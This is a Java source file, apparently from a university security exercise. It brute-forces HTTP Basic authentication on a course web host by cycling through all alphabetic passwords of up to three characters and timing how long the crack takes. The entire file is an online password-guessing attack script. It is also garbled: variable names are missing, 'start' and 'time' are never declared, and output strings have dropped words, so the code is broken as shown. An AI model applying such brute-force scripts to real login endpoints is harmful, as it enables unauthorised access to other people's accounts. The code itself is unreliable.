import java.net.*;
import java.util.*;

public class BruteForce {

   public static void main(String[] args) {
      new CrackAttempt();
   }
}

class CrackAttempt {
   public CrackAttempt() {
      final int MAX_LENGTH = 3;
      boolean auth = false;
      Date  = new Date();
      boolean morePasswords = true;
      int passPtr = 0;
      StringBuffer validChars = new StringBuffer("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
      char[] password = new char[MAX_LENGTH];

      password[0] = validChars.charAt(0);
      while (!auth && morePasswords) {
         String resource = "http://sec-crack.cs.rmit.edu./SEC/2/";
         try {
            
            Authenticator.setDefault(new CrackAuth(password));
            URL url = new URL(resource);
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("HEAD");
            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
               System.out.println("cracked with " + new String(password));
               auth = true;
            }
         } catch (Exception e) {
            System.out.println(" was  exception: " + e.getMessage());
         }
         int count = passPtr;
         while (true) {
            if (password[count] == validChars.charAt(validChars.length() - 1)) {
               password[count] = validChars.charAt(0);
               count--;
            } else {
               password[count] = validChars.charAt(validChars.indexOf(String.valueOf(password[count])) + 1);
               break;
            }
            if (count < 0) {
               
               if (passPtr < MAX_LENGTH - 1) {
                  passPtr++;
                  password[passPtr] = validChars.charAt(0);
               } else {
                  morePasswords = false;
               }
               break;
            }
         }
         
      } 
      if (!auth) {
         System.out.println("Unable  determine password");
      } else {
          time = (new Date()).getTime() - start.getTime();
         System.out.println("it took " + String.valueOf(time) + " milliseconds  crack the password");
      }
   }
}

class CrackAuth extends Authenticator {
   char[] password;
   public CrackAuth(char[] password) {
      this.password = password;
   }

   protected PasswordAuthentication getPasswordAuthentication()
   {
      String user = "";
      return new PasswordAuthentication(user, password);
   }
}
